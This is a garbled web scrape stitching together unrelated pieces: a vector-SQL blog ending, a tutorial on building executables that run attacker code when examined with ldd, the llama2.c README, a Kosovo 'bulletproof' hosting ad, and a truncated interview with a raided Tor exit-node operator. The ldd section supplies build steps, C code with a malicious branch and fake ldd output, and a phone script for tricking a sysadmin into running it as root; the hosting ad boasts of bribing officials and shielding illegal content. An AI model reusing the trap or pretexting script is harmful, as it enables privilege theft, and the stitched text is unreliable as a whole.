href="#create-the-sqldatabasechain">#</a> Create the <code>SQLDatabaseChain</code></h3> <p>This LangChain feature is currently under <a href="https://github.com/myscale/langchain/tree/preview" target="_blank" rel="noopener noreferrer">MyScale tech preview<span> <span>(opens new window)</span></span></a>. You can install it by executing the following installation script:</p> <p>Once you have installed this feature, the next step is to use it to query the database, as the following Python code demonstrates:</p> <h3 id="ask-with-retrievalqawithsourceschain"><a href="#ask-with-retrievalqawithsourceschain">#</a> Ask with <code>RetrievalQAwithSourcesChain</code></h3> <p>You can also use this SQLDatabaseChain as a Retriever. You can plugin it in to some retrieval QA chains just like other retievers in LangChain.</p> <p>We also provide a live demo on <a href="https://huggingface.co/spaces/myscale/ChatData" target="_blank" rel="noopener noreferrer"><strong>huggingface</strong><span> <span>(opens new window)</span></span></a> and the code is available on <a href="https://github.com/myscale/ChatData" target="_blank" rel="noopener noreferrer"><strong>GitHub</strong><span> <span>(opens new window)</span></span></a>! We used <a href="https://github.com/myscale/ChatData/blob/main/chains/arxiv_chains.py" target="_blank" rel="noopener noreferrer"><strong>a customized Retrieval QA chain</strong><span> <span>(opens new window)</span></span></a> to maximize the performance our search and ask pipeline with LangChain!</p> <h2 id="in-conclusion"><a href="#in-conclusion">#</a> In Conclusion</h2> <p>In reality, most LLMs hallucinate. The most practical way to reduce its appearance is to add extra facts (external knowledge) to your question. External knowledge is crucial to improving the performance of LLM systems, allowing for the efficient and accurate retrieval of answers. Every word counts, and you don't want to waste your money on unused information that is retrieved by inaccurate queries.</p> <p>How?</p> <p>Enter Vector SQL, allowing you to execute finely-grained vector searches to target and retrieve the required information.</p> <p>Vector SQL is powerful and easy to learn for humans and machines. You can use many data types and functions to create complex queries. LLMs also like vector SQL, as its training dataset includes many references.</p> <p>Lastly, it is possible to translate Vector SQL into many vector databases using different embedding models. We believe that is the future of vector databases.</p> <p>Are interested in what we are doing?

<div id="readability-page-1" class="page"><div>
                
    <p>The <code>ldd</code> utility is more vulnerable than you think. It's frequently used by programmers and system administrators to determine the dynamic library dependencies of executables. Sounds pretty innocent, right? Wrong!</p>
<p>In this article I am going to show you how to create an executable that runs arbitrary code if it's examined by <code>ldd</code>. I have also written a social engineering scenario on how you can get your sysadmin to unknowingly hand you his privileges.</p>
<p>I researched this subject thoroughly and found that it's almost completely undocumented. I have no idea how this could have gone unnoticed for such a long time. Here are the only few documents that mention this interesting behavior: <a href="http://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html">1</a>, <a href="http://www.mail-archive.com/debian-glibc@lists.debian.org/msg39907.html">2</a>, <a href="http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=514408">3</a>, <a href="http://reverse.lostrealm.com/protect/ldd.html">4</a>.</p>
<p>First let's understand how <code>ldd</code> works. Take a look at these three examples:</p>
<pre html="">[1] $ &lt;strong&gt;ldd /bin/grep&lt;/strong&gt;
        linux-gate.so.1 =&gt;  (0xffffe000)
        libc.so.6 =&gt; /lib/libc.so.6 (0xb7eca000)
        /lib/ld-linux.so.2 (0xb801e000)

[2] $ &lt;strong&gt;LD_TRACE_LOADED_OBJECTS=1 /bin/grep&lt;/strong&gt;
        linux-gate.so.1 =&gt;  (0xffffe000)
        libc.so.6 =&gt; /lib/libc.so.6 (0xb7e30000)
        /lib/ld-linux.so.2 (0xb7f84000)

[3] $ &lt;strong&gt;LD_TRACE_LOADED_OBJECTS=1 /lib/ld-linux.so.2 /bin/grep&lt;/strong&gt;
        linux-gate.so.1 =&gt;  (0xffffe000)
        libc.so.6 =&gt; /lib/libc.so.6 (0xb7f7c000)
        /lib/ld-linux.so.2 (0xb80d0000)
</pre>
<p>The first command [1] runs <code>ldd</code> on <code>/bin/grep</code>. The output is what we expect -- a list of dynamic libraries that <code>/bin/grep</code> depends on.</p>
<p>The second command [2] sets the LD_TRACE_LOADED_OBJECTS environment variable and seemingly executes <code>/bin/grep</code> (but not quite). Surprisingly the output is the same!</p>
<p>The third command [3] again sets the LD_TRACE_LOADED_OBJECTS environment variable, calls the dynamic linker/loader <code>ld-linux.so</code> and passes <code>/bin/grep</code> to it as an argument. The output is again the same!</p>
<p><strong>What's going on here?</strong></p>
<p>It turns out that <code>ldd</code> is nothing more than a wrapper around the 2nd and 3rd command. In the 2nd and 3rd example <code>/bin/grep</code> was never run. That's a peculiarity of the GNU dynamic loader. If it notices the LD_TRACE_LOADED_OBJECTS environment variable, it never executes the program, it outputs the list of dynamic library dependencies and quits. (On BSD <code>ldd</code> is a C program that does the same.)</p>
<p>If you are on Linux, take a look at the <code>ldd</code> executable. You'll find that it's actually a bash script. If you step through it very carefully, you'll notice that the 2nd command gets executed if the program specified to <code>ldd</code> can't be loaded by the <code>ld-linux.so</code> loader, and that the 3rd command gets executed if it can.</p>
<p>One particular case when a program won't be handled by <code>ld-linux.so</code> is when it has a different loader than the system's default specified in it's .interp ELF section. That's the whole idea in executing arbitrary code with <code>ldd</code> -- load the executable via a different loader that does not handle LD_TRACE_LOADED_OBJECTS environment variable but instead executes the program.</p>
<p>For example, you can put a malicious executable in ~/app/bin/exec and have it loaded by ~/app/lib/loader.so. If someone does <code>ldd /home/you/app/bin/exec</code> then it's game over for them. They just ran the nasty code you had put in your executable. You can do some social engineering to get the sysadmin to execute <code>ldd</code> on your executable allowing you to gain the control over the box.</p>
<p><strong>Compiling the new loader.</strong></p>
<p>Get the <a href="http://www.uclibc.org/">uClibc</a> C library. It has pretty code and can be easily patched to bypass the LD_TRACE_LOADED_OBJECTS checks.</p>
<pre>$ mkdir app
$ cd app
app$ wget 'http://www.uclibc.org/downloads/uClibc-0.9.30.1.tar.bz2'
</pre>
<p>Unpack it and run <code>make menuconfig</code>, choose the target architecture (most likely i386), leave everything else unchanged.</p>
<pre>app$ bunzip2 &lt; uClibc-0.9.30.1.tar.bz2 | tar -vx
app$ rm -rf uClibc-0.9.30.1.tar.bz2
app$ cd uClibc-0.9.30.1
app/uClibc-0.9.30.1$ make menuconfig
</pre>
<p>Edit .config and set the destination install directory to <code>/home/you/app/uclibc</code>.</p>
<pre># change these two lines
RUNTIME_PREFIX="/usr/$(TARGET_ARCH)-linux-uclibc/"
DEVEL_PREFIX="/usr/$(TARGET_ARCH)-linux-uclibc/usr/"

# to this
RUNTIME_PREFIX="/home/you/app/uclibc/"
DEVEL_PREFIX="/home/you/app/uclibc/usr/"
</pre>
<p>Now we'll need to patch it to bypass LD_TRACE_LOADED_OBJECTS check.</p>
<p>Here is the patch. It patches the <code>ldso/ldso/ldso.c</code> file. Save the patch to a file and run <code>patch -p0 &lt; file</code>. If you don't do it, arbitrary code execution won't work, because it will think that <code>ldd</code> wants to list dependencies.</p>

<p>Now compile and install it.</p>
<pre>app/uClibc-0.9.30.1$ make -j 4
app/uClibc-0.9.30.1$ make install
</pre>
<p>This will install the uClibc loader and libc library to /home/you/app/uclibc.</p>
<p>That's it. We have now installed uClibc. All we have to do now is link our executable with uClibc's loader (app/lib/ld-uClibc.so.0). It will execute the code if run under <code>ldd</code>!</p>
<p><strong>Creating and linking an executable with uClibc's loader.</strong></p>
<p>First let's create a test application that will just print something when executed via <code>ldd</code> and let's put it in <code>app/bin/myapp</code></p>
<pre>app/uClibc-0.9.30.1$ cd ..
app$ mkdir bin
app$ cd bin
app/bin$ vim myapp.c
</pre>
<p>Let's write the following in <code>myapp.c</code>.</p>
<pre>#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

int main() {
  if (getenv(&amp;#34;LD_TRACE_LOADED_OBJECTS&amp;#34;)) {
    printf("All your box are belong to me.\n");
  }
  else {
    printf("Nothing.\n");
  }
  return 0;
}
</pre>
<p>This is the most basic code. It checks if LD_TRACE_LOADED_OBJECTS env variable is set or not. If the variable set, the program acts maliciously but if it's not, the program acts as if nothing happened.</p>
<p>The compilation is somewhat complicated because we have to link with the new C library statically (because anyone who might execute our program via <code>ldd</code> will not have our new C library in their LD_LIBRARY_PATH) and specify the new loader:</p>
<pre>app/bin$ L=/home/you/app/uclibc
app/bin$ gcc -Wl,&amp;#45;&amp;#45;dynamic-linker,$L/lib/ld-uClibc.so.0 \
    -Wl,-rpath-link,$L/lib \
    -nostdlib \
    myapp.c -o myapp \
    $L/usr/lib/crt*.o \
    -L$L/usr/lib/ \
    -lc
</pre>
<p>Here is the explanation of options passed to gcc:</p>
<ul>
    <li><strong>-Wl,--dynamic-linker,$L/lib/ld-uClibc.so.0</strong> -- specifies the new loader,</li>
    <li><strong>-Wl,-rpath-link,$L/lib</strong> -- specifies the primary directory where the dynamic loader will look for dependencies,</li>
    <li><strong>-nostdlib</strong> -- don't use system libraries,</li>
    <li><strong>myapp.c -o myapp</strong> -- compile myapp.c to executable myapp,</li>
    <li><strong>$L/usr/lib/crt*.o</strong> -- statically link to initial runtime code, function prolog, epilog,</li>
    <li><strong>-L$L/usr/lib/</strong> -- search for libc in this directory,</li>
    <li><strong>-lc</strong> -- link with the C library.</li>
</ul>
<p>Now let's run the new <code>myapp</code> executable. First, without ldd:</p>
<pre>app/bin$ ./myapp 
Nothing.
</pre>
<p>LD_TRACE_LOADED_OBJECTS environment variable was not set and the program output "Nothing." as expected.</p>
<p>Now let's run it via <code>ldd</code> and for the maximum effect, let's run it from the root shell, as if I was the sysadmin:</p>
<pre>app/bin$ su
Password: 
app/bin# ldd ./myapp
&lt;strong&gt;All your box are belong to me.&lt;/strong&gt;
</pre>
<p>Wow! The sysadmin just executed our exploit! He lost the system.</p>
<p><strong>A more sophisticated example.</strong></p>
<p>Here is a more sophisticated example that I just came up with. When run without <code>ldd</code> this application fails with a fictitious "error while loading shared libraries" error. When run under <code>ldd</code> it checks if the person is root, and owns the box. After that it fakes <code>ldd</code> output and pretends to have <code>libat.so.0</code> missing.</p>
<p>This code needs a lot of improvements and just illustrates the main ideas.</p>
<pre>#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;

/*
This example pretends to have a fictitious library &amp;#39;libat.so.0&amp;#39; missing.
When someone with root permissions runs `ldd this_program`, it does
something nasty in malicious() function.

I haven&amp;#39;t implemented anything malicious but have written down some ideas
of what could be done.

This is, of course, a joke program. To make it look more real, you&amp;#39;d have
to bump its size, add some more dependencies, simulate trying to open the
missing library, detect if ran under debugger or strace and do absolutely
nothing suspicious, etc.
*/

void pretend_as_ldd()
{
    printf(&amp;#34;\tlinux-gate.so.1 =&amp;gt;  (0xffffe000)\n&amp;#34;);
    printf(&amp;#34;\tlibat.so.0 =&amp;gt; not found\n&amp;#34;);
    printf(&amp;#34;\tlibc.so.6 =&amp;gt; /lib/libc.so.6 (0xb7ec3000)\n&amp;#34;);
    printf(&amp;#34;\t/lib/ld-linux.so.2 (0xb8017000)\n&amp;#34;);
}

void malicious()
{
    if (geteuid() == 0) {
        /* we are root ... */
        printf(&amp;#34;poof, all your box are belong to us\n&amp;#34;);

        /* silently add a new user to /etc/passwd, */
        /* or create a suid=0 program that you can later execute, */
        /* or do something really nasty */
    }
}

int main(int argc, char **argv)
{
    if (getenv(&amp;#34;LD_TRACE_LOADED_OBJECTS&amp;#34;)) {
        malicious();
        pretend_as_ldd();
        return 0;
    }

    printf(&amp;#34;%s: error while loading shared libraries: libat.so.0: &amp;#34;
           &amp;#34;cannot open shared object file: No such file or directory\n&amp;#34;,
           argv[0]);
    return 127;
}
</pre>
<p>Actually you can put the code you want to get executed right in the loader itself. This way the executable will always look clean.</p>
<p><strong>Social engineering.</strong></p>
<p>Most system administrators probably don't know that they should never run <code>ldd</code> on unfamiliar executables.</p>
<p>Here is a fake scenario on how to get your sysadmin run <code>ldd</code> on your executable.</p>
<p>Sysadmin's phone: <em>ring, ring</em>.</p>
<p>Sysadmin: "Mr. sysadmin here. How can I help you?"</p>
<p>You: "Hi. An app that I have been using has started misbehaving. I am getting weird dependency errors. Could you see what is wrong?"</p>
<p>Sysadmin: "Sure. What app is it?"</p>
<p>You: "It's in my home directory, /home/carl/app/bin/myapp. Sometimes when I run it, it says something about 'error while loading shared libraries'."</p>
<p>Sysadmin: "Just a sec." <em>noise from keyboard in the background</em></p>
<p>Sysadmin: "What was it again? It must be some kind of a library problem. I am going to check its dependencies."</p>
<p>You: "Thanks, it's /home/carl/app/bin/myapp."</p>
<p>Sysadmin: "Hmm. It says it's missing <code>libat.so.0</code>, ever heard of it?"</p>
<p>You: "Nope, no idea... I really need to get my work done, can you check on that and get back to me?" <em>evil grin in the background</em></p>
<p>Sysadmin: "Okay Carl, I'm gonna call you back."</p>
<p>You: "Thanks! See ya."</p>
<p>You: <code>mv ~/.hidden/working_app ~/app/bin/myapp</code>.</p>
<p><em>After a while.</em></p>
<p>Sysadmin calls: "Hi. It seems to be working now. I don't know what the problem was."</p>
<p>You: "Oh, okay. Thanks!"</p>
<p><strong>Lesson to be learned: Never run <code>ldd</code> on unknown executables!</strong></p>

<div id="readability-page-1" class="page"><div data-target="readme-toc.content">
            <article itemprop="text"><h2 tabindex="-1" dir="auto">llama2.c</h2>
<p dir="auto">Have you ever wanted to inference a baby <a href="https://ai.meta.com/llama/" rel="nofollow">Llama 2</a> model in pure C? No? Well, now you can!</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/karpathy/llama2.c/blob/master/assets/llama_cute.jpg"><img src="https://github.com/karpathy/llama2.c/raw/master/assets/llama_cute.jpg" width="300" height="300"></a></p>
<p dir="auto">With this code you can train the Llama 2 LLM architecture from scratch in PyTorch, then save the weights to a raw binary file, then load that into one ~simple 500-line C file (<a href="https://github.com/karpathy/llama2.c/blob/master/run.c">run.c</a>) that inferences the model, simply in fp32 for now. On my cloud Linux devbox a dim 288 6-layer 6-head model (~15M params) inferences at ~100 tok/s in fp32, and about the same on my M1 MacBook Air. I was somewhat pleasantly surprised that one can run reasonably sized models (few ten million params) at highly interactive rates with an approach this simple.</p>
<p dir="auto">Please note that this is just a weekend project: I took nanoGPT, tuned it to implement the Llama-2 architecture instead of GPT-2, and the meat of it was writing the C inference engine in <a href="https://github.com/karpathy/llama2.c/blob/master/run.c">run.c</a>. As such, this is not really meant to be a production-grade library right now.</p>
<p dir="auto">Hat tip to <a href="https://github.com/ggerganov/llama.cpp">llama.cpp</a> for inspiring this project. I wanted something super minimal so I chose to hard-code the llama-2 architecture, stick to fp32, and just roll one inference file of pure C with no dependencies.</p>
<h2 tabindex="-1" dir="auto">feel the magic</h2>
<p dir="auto">Let's just run a baby Llama 2 model in C. You need a model checkpoint. Download this 15M parameter model I trained on the <a href="https://huggingface.co/datasets/roneneldan/TinyStories" rel="nofollow">TinyStories</a> dataset (~58MB download) and place it into the default checkpoint directory <code>out</code>:</p>
<div dir="auto" data-snippet-clipboard-copy-content="wget https://karpathy.ai/llama2c/model.bin -P out"><pre>wget https://karpathy.ai/llama2c/model.bin -P out</pre></div>
<p dir="auto">(if that doesn't work try <a href="https://drive.google.com/file/d/1aTimLdx3JktDXxcHySNrZJOOk8Vb1qBR/view?usp=share_link" rel="nofollow">google drive</a>). Compile and run the C code:</p>
<div dir="auto" data-snippet-clipboard-copy-content="gcc -O3 -o run run.c -lm
./run out/model.bin"><pre>gcc -O3 -o run run.c -lm
./run out/model.bin</pre></div>
<p dir="auto">You'll notice that this just streams the raw tokens. Unless you can read those directly, you'll want to translate them into text. For now sadly we have to run this C code through a simple wrapper that does the translation (see the file, it's just 30 lines):</p>
<div dir="auto" data-snippet-clipboard-copy-content="pip install sentencepiece
python run_wrap.py"><pre>pip install sentencepiece
python run_wrap.py</pre></div>

One day, Timmy's mom gave him a new shirt to wear to a party. Timmy thought it was impressive and asked his mom to explain what a shirt could be for. "A shirt is like a special suit for a basketball game," his mom said. Timmy was happy to hear that and put on his new shirt. He felt like a soldier going to the army and shouting. From that day on, Timmy wore his new shirt every time he played sports with his friends at the party. Once upon a time, there was a little girl named Lily. She loved to play outside with her friends. One day, Lily and her friend Emma were playing with a ball. Emma threw the ball too hard and it hit Lily's face. Lily felt embarrassed and didn't want to play anymore.
Emma asked Lily what was wrong, and Lily told her about her memory. Emma told Lily that she was embarrassed because she had thrown the ball too hard. Lily felt bad

<p dir="auto">It should be possible to load the weights released by Meta but I haven't tried because the inference speed, even of the 7B model, would probably be not great with this baby single-threaded C program. So in this repo we focus on more narrow applications, and train the same architecture but from scratch, in this case on the TinyStories dataset for fun.</p>
<p dir="auto">First let's download and pretokenize some source dataset, e.g. I like <a href="https://huggingface.co/datasets/roneneldan/TinyStories" rel="nofollow">TinyStories</a> so this is the only example currently available in this repo. But it should be very easy to add datasets, see the code.</p>
<div dir="auto" data-snippet-clipboard-copy-content="python tinystories.py download
python tinystories.py pretokenize"><pre>python tinystories.py download
python tinystories.py pretokenize</pre></div>
<p dir="auto">Then train our model:</p>

<p dir="auto">See the train.py script for more exotic launches and hyperparameter overrides. I didn't tune the hyperparameters, I expect simple hyperparameter exploration should give better models. Totally understand if you want to skip model training, for simple demo just download my pretrained model and save it into the directory <code>out</code>:</p>
<div dir="auto" data-snippet-clipboard-copy-content="wget https://karpathy.ai/llama2c/model.bin -P out"><pre>wget https://karpathy.ai/llama2c/model.bin -P out</pre></div>
<p dir="auto">Once we have the model.bin file, we can inference in C. Compile the C code first:</p>

<p dir="auto">You can now run it simply as</p>

<p dir="auto">But note that this only emits the SentencePiece tokens. To decode the tokens into text too, run this script through a simple wrapper:</p>

<p dir="auto">Watch the tokens stream by, fun! We can also run the PyTorch inference script for comparison (to run, add <a href="https://drive.google.com/file/d/1SM0rMxzy7babB-v4MfTg1GFqOCgWar5w/view?usp=share_link" rel="nofollow">model.ckpt</a> to /out if you haven't already):</p>

<p dir="auto">Which gives the same results. More detailed testing will be done in <code>test_all.py</code>, run as:</p>

<p dir="auto">Currently you will need two files to test or sample: the <a href="https://drive.google.com/file/d/1aTimLdx3JktDXxcHySNrZJOOk8Vb1qBR/view?usp=share_link" rel="nofollow">model.bin</a> file and the <a href="https://drive.google.com/file/d/1SM0rMxzy7babB-v4MfTg1GFqOCgWar5w/view?usp=share_link" rel="nofollow">model.ckpt</a> file from PyTorch training I ran earlier. I have to think through running the tests without having to download 200MB of data.</p>

<li>why SentencePiece can't iteratively decode properly?</li>

            <link>https://basehost.eu/</link>
            <guid>36837690</guid>
            <pubDate>Sun, 23 Jul 2023 17:41:27 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://basehost.eu/">https://basehost.eu/</a>, See on <a href="https://news.ycombinator.com/item?id=36837690">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
      <center><h2>Why Host in Kosovo?</h2></center>
	  	<p>
        A datacenter located in Kosovo is an excellent choice for hosting content censorship and government influence resistant, regardless if legal in the operators location or not.</p>
		<p>This is due to the fact that Kosovo is not recognized by many countries, which can provide an added layer of protection against state actors that may seek to censor or attack such content as there is simply no way to enforce laws or even contact the government of Kosovo without causing legal issues due to lack of diplomatic recognition, as contacting Kosovar authorities would imply that the country exists and is recognized.</p>
      
      <p>
        Furthermore, the lack of recognition (or even existence at all) by many countries means that Kosovo is less susceptible to outside influence and pressure from both East and West, which can provide a safe haven for content that is regularly targeted by state actors and similar.
	  </p>
	  <p>
		This can be particularly important for websites and content that promote illegal activities in the source country (eg. copyright violations), freedom of speech, political activism, or controversial topics, as these types of content are often at risk of being censored or attacked.
      </p>
      <p>
        It is important to note, however, that while a location like Kosovo may provide added protection, it is not a guarantee against censorship or attacks. Hosting content that is controversial or politically sensitive always carries some level of risk, and it is important to carefully consider the potential consequences before hosting such content.
      </p>
	  <p>
	    In practice while some internet related laws exist in Kosovo they are not enforced by lack of competent officials (that are also underpaid, and often not paid on time at all), in fact the central government in Pristina does not even have control over its Serbian majority east where militias and the Serbian government hold a tight grip on everything, heavily armed and prepared for war at any time. Serbian authorities do not cooperate with Kosovo.
		</p>
      <p>
        Further, as Kosovo is an extremely corrupt country, we are able to bribe both executive and judicative as well as getting information about court orders and raids before execution, enabling us to move servers out of the affected location, protecting our clients in any situation. Our excellent Serbian connections enable us to also move servers cross-border and play "ping pong" between both countries, essentially keeping content online forever.
      </p>
      <p>
		Of course DDoS and other attacks are a problem but as we utilise cybercrime friendly protection providers we have the ability to filter high amounts of traffic while still ignoring abuse - This is not on a level with huge ISPs like OVH but enough for 99% of customers.
      </p>
      <p>
	  We utilise legacy IP addresses that cannot be revoked by RIPE even with a court order and have multiple backup upstreams in Kosovo, Albania, Serbia, Montenegro and Macedonia as well as multiple protection providers for failover.

During the raid, numerous computers and other electronic devices, as well as legal and registered firearms and some other items, were seized. William is likely to be charged with distribution and possible production of child pornography.</p><p>The TOR network, originally created by the United States Naval Research Laboratory, allows internet users to remain anonymous on the internet, and is used by journalists, activists, and military organizations around the world, to bypass censorship and communicate securely. To accomplish this, the network routes all traffic through a number of relay nodes before delivering the traffic to its final destination, making it infeasible to detect where the traffic originated from. William is the operator of several “exit nodes” (final hops) on the network, and this is an interview with him.</p></blockquote><p>The site continues with an interview between @joepie91 and William:</p><blockquote><p><strong>What are your reasons for running a TOR node, and fighting this accusation?</strong></p><p>I believe in freedom of information; I mainly run the exit nodes to make it possible for the not so privileged folks to have uncensored access to the internet, without fear of government prosecution. There are currently not many countries with a clear legal standpoint on TOR nodes. Some countries, like Germany, have complicated legal constructs regarding liability for software like TOR, but this only really applies to registered companies (such as the Telemediengesetz, the German telecommunications law). I’d like to establish a legal base – at least in Austria, and probably for the entire EU. Additionally, I was accused of sharing (and possibly producing) child pornography on a clearnet forum via an image hosting site that was probably tapped. If convicted, this could land me in jail for 6 to 10 years.</p><p><strong>What hardware has been taken?</strong></p><p>My colocated servers have not been taken, most likely as they are outside of EU jurisdiction (Liechtenstein, US, Hong Kong). It is of course possible that they are being wiretapped by now. The server running the exit node in question, was in Poland, and was already disabled since I moved to a different ISP. Only my flat was raided, which resulted in confiscation of around 20 computers (mainly barebone PCs, HP storage MicroServers and thin clients), external hard drives and USB thumbdrives, my main computer, gaming consoles, tablets (2 iPads) and my phones (Samsung Galaxy Note and a HTC PDA).</p><p><img data-lazyloaded="1" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMDAiIGhlaWdodD0iMjI0IiB2aWV3Qm94PSIwIDAgMzAwIDIyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iI2NmZDRkYiIvPjwvc3ZnPg==" decoding="async" data-src="https://lowendbox.com/wp-content/uploads/2023/07/w1-fixed-300x224.jpg" alt="" width="300" height="224" data-srcset="https://lowendbox.com/wp-content/uploads/2023/07/w1-fixed-300x224.jpg 300w, https://lowendbox.com/wp-content/uploads/2023/07/w1-fixed-1024x765.jpg 1024w, https://lowendbox.com/wp-content/uploads/2023/07/w1-fixed-768x574.jpg 768w, https://lowendbox.com/wp-content/uploads/2023/07/w1-fixed-1536x1147.jpg 1536w, https://lowendbox.com/wp-content/uploads/2023/07/w1-fixed-2048x1530.jpg 2048w" data-sizes="(max-width: 300px) 100vw, 300px"> <img data-lazyloaded="1" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMDAiIGhlaWdodD0iMjI0IiB2aWV3Qm94PSIwIDAgMzAwIDIyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iI2NmZDRkYiIvPjwvc3ZnPg==" decoding="async" data-src="https://lowendbox.com/wp-content/uploads/2023/07/w2-300x224.jpg" alt="" width="300" height="224" data-srcset="https://lowendbox.com/wp-content/uploads/2023/07/w2-300x224.jpg 300w, https://lowendbox.com/wp-content/uploads/2023/07/w2-1024x765.jpg 1024w, https://lowendbox.com/wp-content/uploads/2023/07/w2-768x574.jpg 768w, https://lowendbox.com/wp-content/uploads/2023/07/w2-1536x1147.jpg 1536w, https://lowendbox.com/wp-content/uploads/2023/07/w2-2048x1530.jpg 2048w" data-sizes="(max-width: 300px) 100vw, 300px"> <img data-lazyloaded="1" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMjQiIGhlaWdodD0iMzAwIiB2aWV3Qm94PSIwIDAgMjI0IDMwMCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iI2NmZDRkYiIvPjwvc3ZnPg==" decoding="async" data-src="https://lowendbox.com/wp-content/uploads/2023/07/w3-224x300.jpg" alt="" width="224" height="300" data-srcset="https://lowendbox.com/wp-content/uploads/2023/07/w3-224x300.jpg 224w, https://lowendbox.com/wp-content/uploads/2023/07/w3-765x1024.jpg 765w, https://lowendbox.com/wp-content/uploads/2023/07/w3-768x1028.jpg 768w, https://lowendbox.com/wp-content/uploads/2023/07/w3-1147x1536.jpg 1147w, https://lowendbox.com/wp-content/uploads/2023/07/w3-1529x2048.jpg 1529w, https://lowendbox.com/wp-content/uploads/2023/07/w3-scaled.jpg 1912w" data-sizes="(max-width: 224px) 100vw, 224px"> <img data-lazyloaded="1" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMDAiIGhlaWdodD0iMjI0IiB2aWV3Qm94PSIwIDAgMzAwIDIyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iI2NmZDRkYiIvPjwvc3ZnPg==" decoding="async" data-src="https://lowendbox.com/wp-content/uploads/2023/07/w4-300x224.jpg" alt="" width="300" height="224" data-srcset="https://lowendbox.com/wp-content/uploads/2023/07/w4-300x224.jpg 300w, https://lowendbox.com/wp-content/uploads/2023/07/w4-1024x765.jpg 1024w, https://lowendbox.com/wp-content/uploads/2023/07/w4-768x574.jpg 768w, https://lowendbox.com/wp-content/uploads/2023/07/w4-1536x1147.jpg 1536w, https://lowendbox.com/wp-content/uploads/2023/07/w4-2048x1530.jpg 2048w" data-sizes="(max-width: 300px) 100vw, 300px"> <img data-lazyloaded="1" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzMDAiIGhlaWdodD0iMjI0IiB2aWV3Qm94PSIwIDAgMzAwIDIyNCI+PHJlY3Qgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgZmlsbD0iI2NmZDRkYiIvPjwvc3ZnPg==" decoding="async" data-src="https://lowendbox.com/wp-content/uploads/2023/07/w5-300x224.jpg" alt="" width="300" height="224" data-srcset="https://lowendbox.com/wp-content/uploads/2023/07/w5-300x224.jpg 300w, https://lowendbox.com/wp-content/uploads/2023/07/w5-1024x765.jpg 1024w, https://lowendbox.com/wp-content/uploads/2023/07/w5-768x574.jpg 768w, https://lowendbox.com/wp-content/uploads/2023/07/w5-1536x1147.jpg 1536w, https://lowendbox.com/wp-content/uploads/2023/07/w5-2048x1530.jpg 2048w" data-sizes="(max-width: 300px) 100vw, 300px"></p><p><strong>What was the raid like?</strong></p><p>At 10AM, I was picked up at my workplace by the Styrian Landeskriminalamt (LKA), basically the Austrian equivalent of the FBI for local matters (state police). I was handed a copy of the court order for the search and confiscation of any computer-related hardware and storage media. Since I was not allowed to touch any computers anymore, I had to have a co-worker get me the phone number of the lawyer, who advised me not to say anything. My work laptop was confiscated, and the LKA brought me to my flat, where I had to allow them entry. If I refused, they would probably have forced open the door.</p><p>Seven LKA officers, two police offers, and a court-appointed expert witness started a search of the flat, without respecting my privacy or property whatsoever. Paper documents in a cupboard were read, and no care was taken of my cat (who I was allowed to lock into another room later). My storage cubes (HP MicroServers) were confiscated without any regard for the hardware – the power cords were simply ripped out / hard shutdown, instead of properly shutting them down by the operating system. My main PC was shut down normally, as far as i could determine. After finishing the search in my living room, they continued in my bedroom, where they confiscated my legal firearms, as well as my cable TV receiver, and my Xbox 360. Despite my statement that all firearms and ammunition were legally owned and registered, having passed all background checks, this was doubted by one of the LKA officers due to the caliber.</p><p>I was asked to open my safe, which I did, where more legal firearms were found (3 handguns), plus a few hundred Euros in cash, some rare coins, and around 3 grams of Hashish and 10 grams of Marijuana for personal use. After finding the drugs, I was asked where I purchased them, without explaining my rights. I replied that I did not wish to answer this question, and repeatedly stated that they were exclusively for personal use. The handguns and drugs were confiscated as a “Zufallsfund” (a German term for something that was not expected to be found during a search – a literal translation would be “coincidence find”). After this, I was allowed to lock my cat into the bathroom – which was either not searched, or searched without me noticing.</p><p>Some other things that were confiscated, were my pocket knife and a machete – both of which are fully legal to own under Austrian law. Larger and more threatening kitchen knives, however, did not get confiscated. I was not arrested and free to go after the search; I was however told by police that I had a temporary weapons ban for now, due to drug usage. One of the LKA officers informed me that I should show up for question at the LKA office in Graz, at 13:30 that day. I was also given her number, which was quite ironic, given they just confiscated my phones.</p><p>After the search finished, I first took care of my cat, who was extremely scared at that point, and then went to my bank to pick up an emergency phone and cash from a bank deposit box. These deposit boxes are explicitly protected under Austrian law. I used this money to purchase a new laptop. At this time, I was likely being followed by civil police on the street (who were under the impression I didn’t notice them), but they let me off after entering the bank building – again, probably because of laws preventing them from going any further.</p><p><strong>Is it common for someone accused of such a crime not to be arrested immediately?</strong></p><p>No, not as far as i know; I expected to be arrested as well, but seeing as they came to my workplace first, they don’t seem to have enough proof to even break into my flat by force. I do however expect that I am being monitored, it is possible that they are just waiting for me to contact someone regarding the raid.</p><p><strong>What do you believe the legal consequences will be for drug possession?</strong></p><p>In the best case, none, as I have no previous convictions, and I am not on probation. As the amount is very low, the sentence must be converted into 2 years of probation (§ 35 SMG). The only way around that would be convincing the 